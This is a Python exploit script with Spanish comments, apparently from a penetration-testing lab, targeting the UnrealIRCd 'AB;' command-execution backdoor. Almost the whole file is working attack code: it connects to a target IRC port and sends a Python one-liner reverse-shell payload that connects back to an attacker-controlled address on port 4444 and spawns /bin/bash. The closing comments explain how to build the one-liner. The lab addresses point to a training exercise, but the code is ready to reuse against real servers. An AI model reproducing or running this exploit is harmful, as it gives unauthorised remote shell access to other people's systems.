import socket

class UnrealIRCdExploit: # 1 - Clase
    # 2 - Constructor de la clase
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = target_port
        self.socket = None

    def connect(self): # 3 - Método para establecer la conexión
        try:
            self.socket = socket.create_connection((self.target_ip, self.target_port), timeout=10)
            print(f"[+] Conectado a {self.target_ip}:{self.target_port}")
            self.socket.recv(1024)  # Recibir el banner del servidor
            return True
        except Exception as e:
            print(f"[-] No se pudo conectar a {self.target_ip}:{self.target_port} - {e}")
            return False
        
    def send_command(self, command): # 4 - Método para enviar el comando al servidor y esperar la respuesta
        try:
            self.socket.sendall(command.encode('utf-8'))
            response = self.socket.recv(1024).decode('utf-8')
            return response
        except Exception as e:
            print(f"[-] Error al enviar comando: {e}")
            return None
            
    def exploit(self): # 5 - Método para crear y enviar la carga útil
        payload = "python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.146.138\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'" # Carga útil para crear una shell web
        respuesta = self.send_command(f"AB; {payload} \n")
        if respuesta:
            print("[+] Comando enviado, esperando conexión inversa...")
        else:
            print("[-] No se recibió respuesta del servidor.")
            
    def run(self): # 6 - Método para ejecutar la explotación
        if self.connect():
            self.exploit()
        if self.socket:
                self.socket.close()

# Al poner python -c print('ejemplo'), se va a ejecutar el código directamente desde la línea de comandos.
# Si pongo el ';', puedo ejecutar múltiples comandos en una sola línea.
# Todo el código para la reverse shell lo podríamos poner en una sola línea separando cada instrucción con ';'.
# Para que funcione, hay que poner el payload dentro de comillas dobles, luego la instrucción python -c entre comillas simples, y dentro de esta, las comillas dobles para la IP y puerto de la conexión inversa.

if __name__ == "__main__":
    exploit = UnrealIRCdExploit("192.168.146.139", 6667) # IP y puerto del objetivo
    exploit.run()